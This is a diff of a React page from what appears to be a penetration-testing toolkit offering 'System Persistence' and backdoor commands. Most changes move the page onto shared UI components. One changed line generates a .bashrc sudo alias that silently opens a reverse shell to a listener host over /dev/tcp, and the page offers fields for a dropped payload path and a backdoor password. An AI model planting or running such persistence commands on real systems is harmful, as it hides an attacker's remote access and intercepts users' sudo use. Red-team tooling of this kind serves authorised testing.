@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
-import { Shield, Terminal, Server, Clock, Key, UserPlus, Database, FileCode, ChevronDown, ChevronUp, CheckCircle2 } from 'lucide-react';
+import { Shield, Terminal, Server, Clock, Key, UserPlus, Database, FileCode } from 'lucide-react';
 import { CopyButton } from '../../CopyButtons';
+import { ToolPageHeader, SectionCard, FormField, TipsSection } from '../ui';
 
 // ─── Props ────────────────────────────────────────────────────────
 interface PersistenceProps {
@@ -71,7 +72,7 @@ const METHODS: Record<OSType, PersistenceMethod[]> = {
             label: 'Bashrc Sudo Alias',
             icon: <Terminal className="w-4 h-4 text-purple-400" />,
             note: 'Intercepts sudo to spawn a background reverse shell.',
-            generateCmd: (lh, lp) => `echo 'alias sudo="sudo -S bash -c \\"bash -i >& /dev/tcp/${lh}/${lp} 0>&1 &\\""' >> ~/.bashrc`
+            generateCmd: (lh, lp) => `echo 'alias sudo="sudo -S bash -c \\\\"bash -i >& /dev/tcp/${lh}/${lp} 0>&1 &\\\\""' >> ~/.bashrc`
         },
         {
             id: 'suid-backdoor',
@@ -97,7 +98,6 @@ export default function Persistence({ lhost }: PersistenceProps) {
     const [lport, setLport] = useState('4444');
     const [payloadPath, setPayloadPath] = useState('C:\\ProgramData\\update.exe');
     const [adminPass, setAdminPass] = useState('');
-    const [showTips, setShowTips] = useState(false);
 
     const effectiveLhost = lhost || '10.10.X.X';
 
@@ -109,54 +109,40 @@ export default function Persistence({ lhost }: PersistenceProps) {
 
     return (
         <div className="space-y-6">
-            {/* ── Section Title ── */}
-            <div className="flex items-center gap-3 pt-2">
-                <div className="w-9 h-9 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
-                    <Shield className="w-4 h-4 text-purple-400" />
-                </div>
-                <div>
-                    <h3 className="text-lg font-bold text-white tracking-tight">System <span className="text-purple-400">Persistence</span></h3>
-                    <p className="text-[11px] text-slate-500 font-mono">BACKDOORS & POST_EXPLOITATION</p>
-                </div>
-            </div>
+            <ToolPageHeader
+                icon={Shield}
+                title="System"
+                highlight="Persistence"
+                subtitle="BACKDOORS & POST_EXPLOITATION"
+                color="purple"
+            />
 
             {/* ── Configuration ── */}
-            <div className="bg-slate-900/50 border border-slate-800/50 rounded-2xl p-5 space-y-4">
-                <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider">Listener & Payload Config</h4>
-
+            <SectionCard title="Listener & Payload Config">
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                    <div>
-                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Callback Port (LPORT)</label>
-                        <input
-                            type="text"
-                            value={lport}
-                            onChange={e => setLport(e.target.value)}
-                            placeholder="4444"
-                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
-                        />
-                    </div>
-                    <div>
-                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Dropped Payload Path</label>
-                        <input
-                            type="text"
-                            value={payloadPath}
-                            onChange={e => setPayloadPath(e.target.value)}
-                            placeholder={os === 'windows' ? 'C:\\path\\to\\payload.exe' : '/tmp/payload'}
-                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
-                        />
-                    </div>
-                    <div>
-                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Backdoor Password</label>
-                        <input
-                            type="text"
-                            value={adminPass}
-                            onChange={e => setAdminPass(e.target.value)}
-                            placeholder="Set a secure password..."
-                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
-                        />
-                    </div>
+                    <FormField
+                        label="Callback Port (LPORT)"
+                        value={lport}
+                        onChange={e => setLport(e.target.value)}
+                        placeholder="4444"
+                        color="purple"
+                    />
+                    <FormField
+                        label="Dropped Payload Path"
+                        value={payloadPath}
+                        onChange={e => setPayloadPath(e.target.value)}
+                        placeholder={os === 'windows' ? 'C:\\path\\to\\payload.exe' : '/tmp/payload'}
+                        color="purple"
+                    />
+                    <FormField
+                        label="Backdoor Password"
+                        value={adminPass}
+                        onChange={e => setAdminPass(e.target.value)}
+                        placeholder="Set a secure password..."
+                        color="purple"
+                    />
                 </div>
-            </div>
+            </SectionCard>
 
             {/* ── OS Selector ── */}
             <div className="flex bg-slate-900/50 border border-slate-800/50 rounded-xl p-1 w-full max-w-md">
@@ -208,25 +194,7 @@ export default function Persistence({ lhost }: PersistenceProps) {
             </div>
 
             {/* ── Tips ── */}
-            <div className="bg-slate-900/50 border border-slate-800/50 rounded-2xl overflow-hidden mb-6">
-                <button
-                    onClick={() => setShowTips(v => !v)}
-                    className="w-full flex items-center justify-between px-5 py-4 hover:bg-slate-800/20 transition-colors cursor-pointer"
-                >
-                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider">Persistence Tips</h4>
-                    {showTips ? <ChevronUp className="w-4 h-4 text-slate-500" /> : <ChevronDown className="w-4 h-4 text-slate-500" />}
-                </button>
-                {showTips && (
-                    <div className="px-5 pb-5 space-y-2 animate-page-in">
-                        {TIPS.map((tip, i) => (
-                            <div key={i} className="flex items-start gap-3 bg-slate-900/30 border border-slate-800/30 rounded-xl p-4">
-                                <CheckCircle2 className="w-3.5 h-3.5 text-purple-500/60 flex-shrink-0 mt-0.5" />
-                                <p className="text-xs text-slate-400 leading-relaxed">{tip}</p>
-                            </div>
-                        ))}
-                    </div>
-                )}
-            </div>
+            <TipsSection title="Persistence Tips" tips={TIPS} color="purple" className="mb-6" />
         </div>
     );
 }
